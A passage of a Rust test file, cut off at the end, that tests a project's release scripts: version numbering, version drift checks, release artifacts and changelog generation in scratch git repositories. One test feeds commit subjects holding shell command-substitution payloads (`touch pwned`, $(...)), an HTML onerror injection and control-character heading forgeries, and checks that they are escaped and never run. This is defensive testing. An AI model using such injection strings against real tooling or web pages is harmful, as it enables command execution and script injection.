//! The release tooling: `scripts/version.sh`, which works out and writes the repository's one version, and the release
//! workflow, whose rules are read from its file and whose own step scripts are run here as the workflow has them. Each
//! test works in a scratch directory under the default temporary directory: the scripts are pointed at a scratch git
//! repository, a bare repository stands in for the remote, and a stand-in `gh` answers from a file. Nothing here
//! reaches the network, a remote or this checkout's own tags.

use std::collections::BTreeMap;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

const REPO: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../..");

/// Runs git in `dir` and returns what it printed. The commits must not depend on, or be changed by, the settings of
/// whoever runs the test.
fn git_at(dir: &Path, args: &[&str]) -> String {
    let out = git_out(dir, args);
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

fn git_out(dir: &Path, args: &[&str]) -> Output {
    Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_SYSTEM", "/dev/null")
        .env("GIT_AUTHOR_NAME", "test")
        .env("GIT_AUTHOR_EMAIL", "test@example.com")
        .env("GIT_COMMITTER_NAME", "test")
        .env("GIT_COMMITTER_EMAIL", "test@example.com")
        .output()
        .expect("run git")
}

/// A scratch git repository on a branch named `dev`, removed when the test ends.
struct Scratch(PathBuf);

impl Scratch {
    fn new(tag: &str) -> Scratch {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("clock")
            .subsec_nanos();
        let dir =
            std::env::temp_dir().join(format!("arca-release-{}-{nanos}-{tag}", std::process::id()));
        fs::create_dir_all(&dir).expect("create the scratch directory");
        let scratch = Scratch(dir);
        scratch.git(&["init", "-q", "-b", "dev", "."]);
        scratch
    }

    fn git(&self, args: &[&str]) -> String {
        git_at(&self.0, args)
    }

    fn write(&self, path: &str, content: &str) {
        let file = self.0.join(path);
        fs::create_dir_all(file.parent().expect("a parent")).expect("create the directory");
        fs::write(file, content).expect("write the file");
    }

    fn read(&self, path: &str) -> String {
        fs::read_to_string(self.0.join(path)).expect("read the file")
    }

    /// Writes one file and commits it with `subject`.
    fn commit(&self, path: &str, subject: &str) {
        let stamp = self.git(&["rev-list", "--all", "--count"]);
        self.write(path, &format!("{subject} {stamp}\n"));
        self.git(&["add", "-A"]);
        self.git(&["commit", "-q", "-m", subject]);
    }

    fn tag(&self, name: &str) {
        self.git(&["tag", name]);
    }

    fn version(&self, args: &[&str]) -> Output {
        Command::new("bash")
            .arg(Path::new(REPO).join("scripts/version.sh"))
            .args(args)
            .env("ARCA_VERSION_ROOT", &self.0)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .output()
            .expect("run scripts/version.sh")
    }

    /// The script's one line of output, for a command that must succeed.
    fn answer(&self, args: &[&str]) -> String {
        let out = self.version(args);
        assert!(
            out.status.success(),
            "version.sh {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

#[test]
fn the_first_release_of_the_rule_is_0_8_0_with_no_tag_and_after_the_alpha_tags() {
    let scratch = Scratch::new("first");
    scratch.commit("crates/a/src/lib.rs", "feat(a): a start");
    assert_eq!(scratch.answer(&["next"]), "0.8.0", "no tag yet");
    assert_eq!(scratch.answer(&["last"]), "", "no tag yet");
    assert_eq!(
        scratch.answer(&["kind"]),
        "full",
        "everything ships the first time"
    );

    for n in 1..=7 {
        scratch.tag(&format!("v0.1.0-alpha.{n}"));
    }
    assert_eq!(
        scratch.answer(&["next"]),
        "0.8.0",
        "the alpha tags are not 0.N.0"
    );
    assert_eq!(
        scratch.answer(&["last"]),
        "v0.1.0-alpha.7",
        "changes are counted from the last alpha until a 0.N.P tag exists"
    );
    // No release of the rule exists to patch, so a patch-kind change takes the first full number too.
    assert_eq!(scratch.answer(&["next-for", "patch"]), "0.8.0");
    assert_eq!(scratch.answer(&["next-for", "full"]), "0.8.0");
    let refused = scratch.version(&["next-patch"]);
    assert_eq!(refused.status.code(), Some(1));
    assert!(String::from_utf8_lossy(&refused.stderr).contains("no release to patch"));
}

#[test]
fn the_next_number_is_one_above_the_highest_compared_as_numbers() {
    let scratch = Scratch::new("numeric");
    scratch.commit("crates/a/src/lib.rs", "feat(a): a start");
    scratch.tag("v0.8.0");
    assert_eq!(scratch.answer(&["next"]), "0.9.0");
    assert_eq!(scratch.answer(&["next-patch"]), "0.8.1");

    scratch.tag("v0.9.0");
    scratch.tag("v0.10.0");
    assert_eq!(
        scratch.answer(&["next"]),
        "0.11.0",
        "10 is above 9: numbers, not text"
    );

    // A patch does not move the next full release, and the next patch is counted on the newest minor as a number.
    scratch.tag("v0.10.9");
    assert_eq!(scratch.answer(&["next"]), "0.11.0");
    assert_eq!(scratch.answer(&["next-patch"]), "0.10.10");
    assert_eq!(scratch.answer(&["next-for", "patch"]), "0.10.10");
    assert_eq!(scratch.answer(&["next-for", "full"]), "0.11.0");

    // Tags that are not releases of this rule take no number: another major, a leading zero, a suffix, another name.
    for other in [
        "v1.40.0",
        "v0.050.0",
        "v0.60.0-rc1",
        "v0.70",
        "release-0.80.0",
        "0.90.0",
    ] {
        scratch.tag(other);
    }
    assert_eq!(scratch.answer(&["next"]), "0.11.0");
    assert_eq!(scratch.answer(&["next-patch"]), "0.10.10");
}

#[test]
fn a_tag_off_the_history_takes_its_number_and_nothing_is_counted_from_it() {
    let scratch = Scratch::new("offline");
    scratch.commit("crates/a/src/lib.rs", "feat(a): a start");
    scratch.tag("v0.8.0");
    scratch.commit("packages/arca-canvas-dsh/index.js", "feat(canvas): a card");

    // A release tag on a commit dev never got.
    scratch.git(&["checkout", "-q", "--orphan", "elsewhere"]);
    scratch.git(&["commit", "-q", "--allow-empty", "-m", "chore: another line"]);
    scratch.tag("v0.12.0");
    scratch.git(&["checkout", "-q", "dev"]);

    assert_eq!(
        scratch.answer(&["next"]),
        "0.13.0",
        "a number is never used twice"
    );
    assert_eq!(scratch.answer(&["next-patch"]), "0.12.1");
    assert_eq!(
        scratch.answer(&["last"]),
        "v0.8.0",
        "changes are counted from the newest tag dev holds"
    );
    assert_eq!(scratch.answer(&["kind"]), "patch");
}

#[test]
fn the_paths_decide_between_a_full_release_a_patch_and_none() {
    let scratch = Scratch::new("kind");
    scratch.commit("crates/a/src/lib.rs", "feat(a): a start");
    scratch.tag("v0.8.0");
    assert_eq!(
        scratch.answer(&["kind"]),
        "none",
        "nothing since the release"
    );

    // Inert: documents, tests, the workflows, the licence files.
    for path in [
        "docs/OPERATING.md",
        "README.md",
        "CHANGELOG.md",
        ".github/workflows/release.yml",
        "crates/a/tests/it.rs",
        "packages/arca-canvas-dsh/test/canvas.test.js",
        "NOTICE",
        ".gitignore",
    ] {
        scratch.commit(path, "docs: words");
        assert_eq!(scratch.answer(&["kind"]), "none", "{path} ships nothing");
    }

    // A patch: it ships, and the binary is not built from it.
    for path in [
        "packages/arca-canvas-dsh/index.js",
        "deploy/systemd/arca-watch.service",
        "schema/arca.openrpc.json",
        "scripts/release.sh",
        "scripts/install.sh",
    ] {
        scratch.commit(path, "fix(canvas): a part");
        assert_eq!(scratch.answer(&["kind"]), "patch", "{path} is a patch");
    }
    scratch.git(&["tag", "v0.8.1"]);
    assert_eq!(scratch.answer(&["kind"]), "none");

    // Full: what the binary is built from, and any path nobody has classed.
    for path in [
        "crates/a/src/lib.rs",
        "Cargo.lock",
        "rust-toolchain.toml",
        "templates/nats.json",
        "ontology/arca.json",
        "wit/arca-plugin.wit",
        "scripts/build-portable.sh",
        "somewhere/new.txt",
    ] {
        let before = scratch.git(&["rev-parse", "HEAD"]);
        scratch.commit(path, "feat(a): more");
        assert_eq!(
            scratch.answer(&["kind"]),
            "full",
            "{path} is a full release"
        );
        // A patch-kind change beside it does not make it less.
        assert_eq!(scratch.answer(&["kind", "v0.8.0"]), "full");
        scratch.git(&["reset", "-q", "--hard", &before]);
    }

    // A file that left a shipping path counts, though only its removal is under it.
    scratch.git(&["mv", "crates/a/src/lib.rs", "docs/moved.md"]);
    scratch.git(&["commit", "-q", "-m", "refactor(a): moved"]);
    assert_eq!(scratch.answer(&["kind"]), "full");

    let unknown = scratch.version(&["kind", "v9.9.9"]);
    assert_eq!(
        unknown.status.code(),
        Some(1),
        "a tag that does not exist is refused"
    );
}

/// Copies the files that carry the version from this checkout into a scratch tree.
fn copy_version_files(scratch: &Scratch) {
    let repo = Path::new(REPO);
    let mut files = vec![
        "Cargo.toml".to_string(),
        "Cargo.lock".to_string(),
        "packages/arca-canvas-dsh/package.json".to_string(),
        "packages/arca-canvas-dsh/package-lock.json".to_string(),
        "scripts/install.sh".to_string(),
    ];
    for entry in fs::read_dir(repo.join("crates")).expect("the crates directory") {
        let dir = entry.expect("a crate directory").path();
        if dir.join("Cargo.toml").is_file() {
            let name = dir.file_name().expect("a name").to_string_lossy();
            files.push(format!("crates/{name}/Cargo.toml"));
        }
    }
    for file in files {
        scratch.write(
            &file,
            &fs::read_to_string(repo.join(&file)).expect("read a version file"),
        );
    }
}

/// How many lines differ between two texts with the same number of lines.
fn changed_lines(before: &str, after: &str) -> usize {
    assert_eq!(
        before.lines().count(),
        after.lines().count(),
        "no line is added or removed"
    );
    before
        .lines()
        .zip(after.lines())
        .filter(|(a, b)| a != b)
        .count()
}

#[test]
fn this_checkout_carries_one_version_everywhere() {
    let out = Command::new("bash")
        .arg(Path::new(REPO).join("scripts/version.sh"))
        .arg("check")
        .env_remove("ARCA_VERSION_ROOT")
        .output()
        .expect("run scripts/version.sh");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let said = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        said.trim(),
        format!("version: {} everywhere", env!("CARGO_PKG_VERSION"))
    );
}

#[test]
fn set_writes_the_version_into_every_field_and_touches_no_other_line() {
    let scratch = Scratch::new("set");
    copy_version_files(&scratch);
    let crates = fs::read_dir(Path::new(REPO).join("crates"))
        .expect("the crates directory")
        .count();
    let before: Vec<String> = [
        "Cargo.toml",
        "Cargo.lock",
        "packages/arca-canvas-dsh/package.json",
        "packages/arca-canvas-dsh/package-lock.json",
        "scripts/install.sh",
    ]
    .iter()
    .map(|file| scratch.read(file))
    .collect();

    assert_eq!(scratch.answer(&["set", "0.8.0"]), "version: 0.8.0");
    assert_eq!(scratch.answer(&["check"]), "version: 0.8.0 everywhere");

    assert_eq!(
        changed_lines(&before[0], &scratch.read("Cargo.toml")),
        1,
        "the workspace version line"
    );
    assert!(
        scratch
            .read("Cargo.toml")
            .contains("[workspace.package]\nversion = \"0.8.0\"\n")
    );
    assert_eq!(
        changed_lines(&before[1], &scratch.read("Cargo.lock")),
        crates,
        "one line per workspace crate, and no dependency's"
    );
    assert_eq!(
        changed_lines(
            &before[2],
            &scratch.read("packages/arca-canvas-dsh/package.json")
        ),
        1
    );
    assert_eq!(
        changed_lines(
            &before[3],
            &scratch.read("packages/arca-canvas-dsh/package-lock.json")
        ),
        2,
        "the lock's own version and its root package's"
    );
    assert_eq!(
        changed_lines(&before[4], &scratch.read("scripts/install.sh")),
        1,
        "the release the installer installs"
    );
    assert!(
        scratch
            .read("scripts/install.sh")
            .contains("\nARCA_VERSION=0.8.0\n")
    );
    // No dependency in the lock took the number: the lines that say it are the ones that said it before, and the crates'.
    assert_eq!(
        scratch
            .read("Cargo.lock")
            .matches("version = \"0.8.0\"")
            .count(),
        before[1].matches("version = \"0.8.0\"").count() + crates
    );

    // What is not a version of the rule is refused, and nothing is written.
    for bad in [
        "0.1.0-alpha.8",
        "1.0.0",
        "0.9",
        "0.09.0",
        "v0.9.0",
        "0.9.0 ",
        "",
    ] {
        let out = scratch.version(&["set", bad]);
        assert!(!out.status.success(), "{bad:?} is refused");
    }
    assert_eq!(scratch.answer(&["check"]), "version: 0.8.0 everywhere");

    // A field that drifts is named, and the check fails.
    let lock = scratch
        .read("packages/arca-canvas-dsh/package-lock.json")
        .replacen("\"version\": \"0.8.0\"", "\"version\": \"0.7.0\"", 1);
    scratch.write("packages/arca-canvas-dsh/package-lock.json", &lock);
    let drift = scratch.version(&["check"]);
    assert_eq!(drift.status.code(), Some(1));
    let said = String::from_utf8_lossy(&drift.stderr);
    assert!(
        said.contains("packages/arca-canvas-dsh/package-lock.json version = 0.7.0, not 0.8.0"),
        "{said}"
    );
}

#[test]
fn set_writes_nothing_when_a_field_is_missing() {
    let scratch = Scratch::new("missing");
    copy_version_files(&scratch);
    // One crate's entry leaves the lock.
    let lock = scratch.read("Cargo.lock").replacen(
        "name = \"arca-wit\"\nversion = ",
        "name = \"arca-wit\"\nrevision = ",
        1,
    );
    scratch.write("Cargo.lock", &lock);
    let manifest = scratch.read("Cargo.toml");

    let out = scratch.version(&["set", "0.8.0"]);
    assert_eq!(out.status.code(), Some(1));
    let said = String::from_utf8_lossy(&out.stderr);
    assert!(
        said.contains("Cargo.lock has no [[package]] arca-wit version; nothing was written"),
        "{said}"
    );
    assert_eq!(scratch.read("Cargo.toml"), manifest, "nothing was written");
    assert_eq!(scratch.read("Cargo.lock"), lock);
}

#[test]
fn the_installer_s_version_line_is_one_field_like_the_others() {
    let installer = "scripts/install.sh";
    let line = format!("ARCA_VERSION={}\n", env!("CARGO_PKG_VERSION"));
    let own = fs::read_to_string(Path::new(REPO).join(installer)).expect("the installer");
    assert_eq!(
        own.matches("\nARCA_VERSION=").count(),
        1,
        "the installer names the release it installs on one line"
    );
    assert!(own.contains(&format!("\n{line}")));

    // An installer left at another number is drift, named like any other field's.
    let scratch = Scratch::new("installer");
    copy_version_files(&scratch);
    scratch.write(installer, &own.replacen(&line, "ARCA_VERSION=0.7.0\n", 1));
    let drift = scratch.version(&["check"]);
    assert_eq!(drift.status.code(), Some(1));
    let said = String::from_utf8_lossy(&drift.stderr);
    assert!(
        said.contains(&format!(
            "scripts/install.sh ARCA_VERSION = 0.7.0, not {}",
            env!("CARGO_PKG_VERSION")
        )),
        "{said}"
    );
    assert_eq!(scratch.answer(&["set", "0.8.0"]), "version: 0.8.0");
    assert_eq!(scratch.answer(&["check"]), "version: 0.8.0 everywhere");

    // A line the script cannot read as the one field is a missing field: the check fails, and set writes nothing.
    let manifest = scratch.read("Cargo.toml");
    for (shape, text) in [
        ("no line", "".to_string()),
        ("quoted", "ARCA_VERSION=\"0.8.0\"\n".to_string()),
        (
            "two lines",
            "ARCA_VERSION=0.8.0\nARCA_VERSION=0.8.0\n".to_string(),
        ),
        ("a command", "ARCA_VERSION=$(cat VERSION)\n".to_string()),
        ("indented", "    ARCA_VERSION=0.8.0\n".to_string()),
    ] {
        let broken = own.replacen(&line, &text, 1);
        scratch.write(installer, &broken);
        let check = scratch.version(&["check"]);
        assert_eq!(check.status.code(), Some(1), "{shape}");
        assert!(
            String::from_utf8_lossy(&check.stderr)
                .contains("scripts/install.sh has no ARCA_VERSION"),
            "{shape}"
        );
        let set = scratch.version(&["set", "0.9.0"]);
        assert_eq!(set.status.code(), Some(1), "{shape}");
        assert!(
            String::from_utf8_lossy(&set.stderr)
                .contains("scripts/install.sh has no ARCA_VERSION; nothing was written"),
            "{shape}"
        );
        assert_eq!(
            scratch.read("Cargo.toml"),
            manifest,
            "{shape}: nothing was written"
        );
        assert_eq!(scratch.read(installer), broken, "{shape}");
    }
    // The installer gone is the same refusal.
    fs::remove_file(scratch.0.join(installer)).expect("remove");
    let gone = scratch.version(&["check"]);
    assert_eq!(gone.status.code(), Some(1));
    assert!(
        String::from_utf8_lossy(&gone.stderr).contains("scripts/install.sh has no ARCA_VERSION")
    );
}

/// scripts/release.sh, run whole in a scratch repository whose build is a stand-in that reports a program saying the
/// right version line. The script's own steps are the real ones.
#[test]
fn the_release_files_carry_the_installer_and_an_installer_at_another_version_stops_the_release() {
    let scratch = Scratch::new("release-sh");
    for script in ["scripts/release.sh", "scripts/install.sh"] {
        scratch.write(
            script,
            &fs::read_to_string(Path::new(REPO).join(script)).expect("the script"),
        );
    }
    scratch.write(
        "Cargo.toml",
        "[workspace]\n\n[workspace.package]\nversion = \"0.8.0\"\n",
    );
    scratch.write(
        "CHANGELOG.md",
        "# Changelog\n\n## Unreleased\n\n## 0.8.0 (2026-11-12)\n\n- a change\n",
    );
    scratch.write(".gitignore", "/dist/\n/out/\n");
    // The stand-in build: a program that says the version line of whatever commit is checked out.
    scratch.write(
        "scripts/build-portable.sh",
        "#!/usr/bin/env bash\nset -euo pipefail\nmkdir -p out\nprintf '#!/bin/sh\\necho \"Automagik Arca 0.8.0 (%s, x86_64-unknown-linux-gnu)\"\\n' \"$(git rev-parse --short HEAD)\" > out/arca\nchmod 0755 out/arca\necho \"binary: $PWD/out/arca\"\necho \"max GLIBC: 2.34\"\n",
    );
    fs::set_permissions(
        scratch.0.join("scripts/build-portable.sh"),
        fs::Permissions::from_mode(0o755),
    )
    .expect("mode");
    let release = |scratch: &Scratch| {
        Command::new("bash")
            .arg(scratch.0.join("scripts/release.sh"))
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .output()
            .expect("run scripts/release.sh")
    };

    // The installer still names the release before: nothing is built, and no file is written.
    scratch.git(&["add", "-A"]);
    scratch.git(&["commit", "-q", "-m", "chore(release): v0.8.0"]);
    scratch.tag("v0.8.0");
    let refused = release(&scratch);
    assert_eq!(refused.status.code(), Some(1));
    let said = String::from_utf8_lossy(&refused.stderr);
    assert!(
        said.contains(&format!(
            "scripts/install.sh installs \"{}\", not 0.8.0",
            env!("CARGO_PKG_VERSION")
        )),
        "{said}"
    );
    assert!(!scratch.0.join("dist").exists() && !scratch.0.join("out").exists());

    // With the installer at the release's version, the files are the binary, the installer as the commit holds it,
    // the checksums of those two in that order, and the notes.
    scratch.git(&["tag", "-d", "v0.8.0"]);
    let own = scratch.read("scripts/install.sh");
    let installer = own.replacen(
        &format!("\nARCA_VERSION={}\n", env!("CARGO_PKG_VERSION")),
        "\nARCA_VERSION=0.8.0\n",
        1,
    );
    scratch.write("scripts/install.sh", &installer);
    scratch.git(&["commit", "-q", "-am", "chore(release): v0.8.0"]);
    scratch.tag("v0.8.0");
    let built = release(&scratch);
    assert!(
        built.status.success(),
        "{}",
        String::from_utf8_lossy(&built.stderr)
    );
    let mut files: Vec<String> = fs::read_dir(scratch.0.join("dist"))
        .expect("dist")
        .map(|entry| {
            entry
                .expect("an entry")
                .file_name()
                .to_string_lossy()
                .to_string()
        })
        .collect();
    files.sort();
    assert_eq!(
        files,
        [
            "RELEASE-NOTES.md",
            "SHA256SUMS",
            "arca-0.8.0-linux-x86_64",
            "install.sh"
        ]
    );
    assert_eq!(scratch.read("dist/install.sh"), installer);
    assert_eq!(
        scratch.git(&["hash-object", "--no-filters", "dist/install.sh"]),
        scratch.git(&["rev-parse", "v0.8.0:scripts/install.sh"]),
        "byte for byte the tag's installer"
    );
    let sums = scratch.read("dist/SHA256SUMS");
    let names: Vec<&str> = sums
        .lines()
        .filter_map(|line| line.split_once("  "))
        .map(|(_, name)| name)
        .collect();
    assert_eq!(names, ["arca-0.8.0-linux-x86_64", "install.sh"]);
    let checked = Command::new("sha256sum")
        .args(["--check", "--strict", "--quiet", "SHA256SUMS"])
        .current_dir(scratch.0.join("dist"))
        .output()
        .expect("run sha256sum");
    assert!(checked.status.success());
    let notes = scratch.read("dist/RELEASE-NOTES.md");
    assert!(notes.starts_with("- a change\n"), "{notes}");
    assert!(
        notes.contains(
            "`sha256sum --check --ignore-missing SHA256SUMS`, and stop unless it prints \
             `arca-0.8.0-linux-x86_64: OK`.\n"
        ),
        "{notes}"
    );
    let said = String::from_utf8_lossy(&built.stdout);
    assert!(
        said.contains("dist/arca-0.8.0-linux-x86_64 dist/install.sh dist/SHA256SUMS"),
        "{said}"
    );
}

const CHANGELOG: &str = "# Changelog\n\nWhat changed.\n\n## Unreleased\n\n<!-- Write here what a reader should know.\nThe release moves it. -->\n\n## 0.1.0-alpha.7\n\nThe first one.\n";

#[test]
fn the_changelog_section_is_written_from_the_subjects_and_what_someone_wrote() {
    let scratch = Scratch::new("changelog");
    scratch.write("CHANGELOG.md", CHANGELOG);
    scratch.git(&["add", "-A"]);
    scratch.git(&["commit", "-q", "-m", "docs: a changelog"]);
    scratch.tag("v0.1.0-alpha.7");

    // What lands on dev: a merge with a review note, a plain commit, and commits that ship nothing by their word.
    scratch.git(&["checkout", "-q", "-b", "work"]);
    scratch.commit("crates/a/src/lib.rs", "feat(a): the inside of the work");
    scratch.git(&["checkout", "-q", "dev"]);
    scratch.git(&[
        "merge",
        "-q",
        "--no-ff",
        "work",
        "-m",
        "merge: tenants get a block of addresses each (review SHIP after fixes)",
    ]);
    scratch.commit(
        "crates/a/src/b.rs",
        "fix(service): a removal confirms the instance is gone",
    );
    scratch.commit("docs/x.md", "docs: words");
    scratch.commit("crates/a/tests/t.rs", "test(a): a case");
    scratch.commit(".github/workflows/x.yml", "ci: a job");

    assert_eq!(
        scratch.answer(&["changelog", "0.8.0", "2026-11-12"]),
        "changelog: 0.8.0 (2026-11-12)"
    );
    assert_eq!(
        scratch.read("CHANGELOG.md"),
        "# Changelog\n\nWhat changed.\n\n## Unreleased\n\n<!-- Write here what a reader should know.\nThe release moves it. -->\n\n\
         ## 0.8.0 (2026-11-12)\n\n\
         - fix(service): a removal confirms the instance is gone\n\
         - tenants get a block of addresses each\n\n\
         ## 0.1.0-alpha.7\n\nThe first one.\n"
    );
    scratch.git(&["commit", "-q", "-am", "chore(release): v0.8.0"]);
    scratch.tag("v0.8.0");

    // The next one: what someone wrote under Unreleased leads, the release commit is not listed, and the comment stays.
    let written = scratch.read("CHANGELOG.md").replacen(
        "The release moves it. -->\n",
        "The release moves it. -->\n\nThe canvas shows a tenant's usage.\nRead docs/OPERATING.md, \"Tenants\".\n",
        1,
    );
    scratch.write("CHANGELOG.md", &written);
    scratch.git(&["commit", "-q", "-am", "docs: a note for the release"]);
    scratch.commit(
        "packages/arca-canvas-dsh/index.js",
        "feat(canvas): a tenant's usage",
    );
    scratch.answer(&["changelog", "0.8.1", "2026-11-13"]);
    let text = scratch.read("CHANGELOG.md");
    assert!(
        text.starts_with(
            "# Changelog\n\nWhat changed.\n\n## Unreleased\n\n<!-- Write here what a reader should know.\nThe release moves it. -->\n\n\
             ## 0.8.1 (2026-11-13)\n\n\
             The canvas shows a tenant's usage.\nRead docs/OPERATING.md, \"Tenants\".\n\n\
             - feat(canvas): a tenant's usage\n\n\
             ## 0.8.0 (2026-11-12)\n\n"
        ),
        "{text}"
    );
    assert!(text.ends_with("## 0.1.0-alpha.7\n\nThe first one.\n"));

    // A version that already has its section is refused, and so is a file with no Unreleased heading.
    let again = scratch.version(&["changelog", "0.8.1", "2026-11-13"]);
    assert_eq!(again.status.code(), Some(1));
    assert_eq!(scratch.read("CHANGELOG.md"), text, "nothing was written");
    scratch.write("CHANGELOG.md", "# Changelog\n\n## 0.8.1 (2026-11-13)\n");
    let headless = scratch.version(&["changelog", "0.9.0", "2026-11-14"]);
    assert_eq!(headless.status.code(), Some(1));
    for bad in [
        ["changelog", "0.9", "2026-11-14"],
        ["changelog", "0.9.0", "tomorrow"],
    ] {
        assert_eq!(scratch.version(&bad).status.code(), Some(1), "{bad:?}");
    }
}

#[test]
fn a_release_with_nothing_to_list_says_so() {
    let scratch = Scratch::new("empty");
    scratch.write("CHANGELOG.md", "# Changelog\n\n## Unreleased\n");
    scratch.git(&["add", "-A"]);
    scratch.git(&["commit", "-q", "-m", "docs: a changelog"]);
    scratch.tag("v0.8.0");
    scratch.answer(&["changelog", "0.8.1", "2026-11-13"]);
    assert_eq!(
        scratch.read("CHANGELOG.md"),
        "# Changelog\n\n## Unreleased\n\n## 0.8.1 (2026-11-13)\n\n- No change is listed for this release.\n"
    );
}

#[test]
fn a_changelog_whose_last_line_is_not_ended_loses_no_line() {
    // The older section's last line has no newline after it: the new section goes in above it, and that line stays as
    // it is, byte for byte.
    let scratch = Scratch::new("unended");
    scratch.write(
        "CHANGELOG.md",
        "# Changelog\n\n## Unreleased\n\n## 0.8.0\n\nThe last line, not ended",
    );
    scratch.git(&["add", "-A"]);
    scratch.git(&["commit", "-q", "-m", "docs: a changelog"]);
    scratch.tag("v0.8.0");
    scratch.commit("crates/a/src/lib.rs", "feat(a): a change");
    scratch.answer(&["changelog", "0.8.1", "2026-11-13"]);
    assert_eq!(
        scratch.read("CHANGELOG.md"),
        "# Changelog\n\n## Unreleased\n\n## 0.8.1 (2026-11-13)\n\n- feat(a): a change\n\n## 0.8.0\n\nThe last line, not ended"
    );

    // The older heading is itself the last line, not ended.
    scratch.write("CHANGELOG.md", "# Changelog\n\n## Unreleased\n\n## 0.8.0");
    scratch.answer(&["changelog", "0.8.1", "2026-11-13"]);
    assert_eq!(
        scratch.read("CHANGELOG.md"),
        "# Changelog\n\n## Unreleased\n\n## 0.8.1 (2026-11-13)\n\n- feat(a): a change\n\n## 0.8.0"
    );

    // The Unreleased section is the last one and its last line is not ended: lines could only go in after it by
    // ending it, which changes it. The command says so and writes nothing.
    for text in [
        "# Changelog\n\n## Unreleased\n\nWritten, and not ended",
        "# Changelog\n\n## Unreleased",
    ] {
        scratch.write("CHANGELOG.md", text);
        let out = scratch.version(&["changelog", "0.8.1", "2026-11-13"]);
        assert_eq!(out.status.code(), Some(1));
        assert!(
            String::from_utf8_lossy(&out.stderr).contains("does not end with a newline"),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(scratch.read("CHANGELOG.md"), text, "nothing was written");
    }
}

#[test]
fn this_checkout_s_changelog_has_the_heading_the_release_writes_under() {
    let text = fs::read_to_string(Path::new(REPO).join("CHANGELOG.md")).expect("CHANGELOG.md");
    assert_eq!(
        text.lines().filter(|line| *line == "## Unreleased").count(),
        1
    );
    assert!(text.ends_with('\n'), "its last line is ended");
}

#[test]
fn with_no_tag_at_all_everything_is_a_full_release() {
    let scratch = Scratch::new("notag");
    scratch.commit("docs/x.md", "docs: only words so far");
    assert_eq!(scratch.answer(&["last"]), "");
    assert_eq!(
        scratch.answer(&["kind"]),
        "full",
        "the first release ships everything"
    );
    assert_eq!(
        scratch.answer(&["kind", ""]),
        "full",
        "no tag, as the workflow passes it"
    );
    assert_eq!(scratch.answer(&["next-for", "full"]), "0.8.0");
}

#[test]
fn a_script_only_the_workflows_call_ships_nothing() {
    let scratch = Scratch::new("ci");
    scratch.commit("crates/a/src/lib.rs", "feat(a): a start");
    scratch.tag("v0.8.0");
    scratch.commit("scripts/ci-setup.sh", "ci: the runner's setup");
    assert_eq!(scratch.answer(&["kind"]), "none");
    // The scripts a person runs too are a patch, and the build script is a full release.
    scratch.commit("scripts/version.sh", "fix(release): the rule");
    assert_eq!(scratch.answer(&["kind"]), "patch");
    scratch.commit("scripts/build-portable.sh", "fix(release): a flag");
    assert_eq!(scratch.answer(&["kind"]), "full");
}

#[test]
fn a_hostile_subject_is_listed_as_one_plain_line_and_is_never_run() {
    let scratch = Scratch::new("hostile");
    scratch.write("CHANGELOG.md", "# Changelog\n\n## Unreleased\n");
    scratch.git(&["add", "-A"]);
    scratch.git(&["commit", "-q", "-m", "docs: a changelog"]);
    scratch.tag("v0.8.0");
    let empty = |subject: &str| {
        scratch.git(&["commit", "-q", "--allow-empty", "-m", subject]);
    };
    // A bare carriage return, which a page would show as a line break: the forged heading must not get a line.
    empty("fix(a): one\r## 9.9.9 (2026-01-01)\r\rA forged section");
    // A subject that is itself a heading, and one that hides it behind control characters and spaces.
    empty("## 0.9.9 a heading");
    empty("\r\t \x1b[31m## after controls");
    // Text a shell would expand or run.
    empty("feat(a): uses `touch pwned-1` and $(touch pwned-2) and ${HOME} and ; touch pwned-3");
    // Text that would open a tag or a comment on a page.
    empty("feat(a): takes <file>, hides the rest <!-- and <img src=x onerror=y>");

    scratch.answer(&["changelog", "0.8.1", "2026-11-13"]);
    assert_eq!(
        scratch.read("CHANGELOG.md"),
        "# Changelog\n\n## Unreleased\n\n## 0.8.1 (2026-11-13)\n\n\
         - feat(a): takes &lt;file>, hides the rest &lt;!-- and &lt;img src=x onerror=y>\n\
         - feat(a): uses `touch pwned-1` and $(touch pwned-2) and ${HOME} and ; touch pwned-3\n\
         - [31m## after controls\n\
         - \\## 0.9.9 a heading\n\
         - fix(a): one## 9.9.9 (2026-01-01)A forged section\n"
    );
    // One heading for the release and no other, no control character, and nothing was run.
    let text = scratch.read("CHANGELOG.md");
    assert_eq!(text.lines().filter(|line| line.starts_with('#')).count(), 3);
    assert!(!text.chars().any(|c| c.is_control() && c != '\n'));
    assert!(!text.contains('<'), "no subject opens a tag or a comment");
    for n in 1..=3 {
        assert!(!scratch.0.join(format!("pwned-{n}")).exists());
    }
}

/// The workflow files as text. They cannot run before they are pushed, so the rules that must never break are read here.
fn workflow(name: &str) -> String {
    fs::read_to_string(Path::new(REPO).join(".github/workflows").join(name)).expect("the workflow")
}

/// The release workflow without its comment lines: the comments are words, not rules.
fn release_rules() -> String {
    workflow("release.yml")
        .lines()
        .filter(|line| !line.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n")
}

/// One job's lines of the release workflow, from its name to the next job's.
fn job(rules: &str, name: &str) -> String {
    let start = rules
        .find(&format!("\n  {name}:\n"))
        .unwrap_or_else(|| panic!("the workflow has a job named {name}"));
    let rest = &rules[start + 1..];
    let end = rest[3..]
        .match_indices("\n  ")
        .find(|(at, _)| {
